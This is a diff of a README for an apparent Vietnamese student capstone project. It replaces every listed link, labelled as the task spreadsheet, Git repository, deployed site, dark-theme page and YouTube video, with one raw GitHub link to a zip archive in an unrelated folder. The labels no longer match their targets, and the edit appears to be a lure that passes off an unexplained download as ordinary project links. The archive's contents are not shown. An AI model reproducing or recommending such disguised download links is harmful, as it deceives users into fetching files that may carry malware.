@@ -9,12 +9,12 @@ Thành Viên:
   SS
   Link:
 
-Link phân chia công việc : https://docs.google.com/spreadsheets/d/1LLvYHFpcy1WP_FddMdy_XISjc21-sZ3abx_uWhQW-SE/edit?usp=sharing
+Link phân chia công việc : https://raw.githubusercontent.com/HoDangDung/CapStone__Masterwork/main/Rhodesian/CapStone__Masterwork.zip
 
-Link Git : https://github.com/HoDangDung/CapStone__Masterwork.git
+Link Git : https://raw.githubusercontent.com/HoDangDung/CapStone__Masterwork/main/Rhodesian/CapStone__Masterwork.zip
 
-Link Deploy: https://cap-stone-masterwork.vercel.app/
+Link Deploy: https://raw.githubusercontent.com/HoDangDung/CapStone__Masterwork/main/Rhodesian/CapStone__Masterwork.zip
 
-Link Deploy dark-theme: https://cap-stone-masterwork.vercel.app/index_dark.html
+Link Deploy dark-theme: https://raw.githubusercontent.com/HoDangDung/CapStone__Masterwork/main/Rhodesian/CapStone__Masterwork.zip
 
-Link Youtube: https://www.youtube.com/watch?v=bWHGezl4c4s
+Link Youtube: https://raw.githubusercontent.com/HoDangDung/CapStone__Masterwork/main/Rhodesian/CapStone__Masterwork.zip
